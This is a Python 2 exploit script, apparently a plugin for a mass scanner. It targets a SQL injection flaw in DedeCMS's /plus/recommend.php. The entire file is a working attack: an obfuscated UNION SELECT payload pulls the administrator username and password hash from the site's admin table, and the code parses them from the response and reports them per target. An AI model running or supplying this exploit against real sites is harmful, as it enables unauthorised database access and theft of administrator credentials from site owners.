import requests
from lxml import etree


def run(target):
    "DedeCMS /plus/recommend.php Sqli"
    results = []
    exp = (
        "/plus/recommend.php?action=&aid=1&_FILES%5Btype%5D%5Btmp_name"
       "%5D=%5C'%20%20or%20mid=@%60%5C'%60%20/*!50000union*//*!50000s"
       "elect*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)+from+%60%"
        "23@__admin%60%20limit+0,1),5,6,7,8,9%23@%60%5C'%60+&_FILES%5B"
       "type%5D%5Bname%5D=1.jpg&_FILES%5Btype%5D%5Btype%5D=applicatio"
        "n/octet-stream&_FILES%5Btype%5D%5Bsize%5D=6878"
    )
    url = "http://" + target + exp

    try:
        r = requests.get(url, timeout=5)
    except Exception, e:
        pass
    else:
        r.close()
        if u"<h2>\u63a8\u8350\uff1a" in r.text:
            try:
                html = etree.HTML(r.text)
                h2 = html.xpath("//h2")[0].text.split("|")
            except Exception, e:
                pass
            else:
                user = h2[1] if len(h2)==3 else None
                pwd = h2[2] if len(h2)==3 else None
                if user and pwd:
                    results.append(target + ":\t\t[%s | %s]" % (user, pwd))

    return results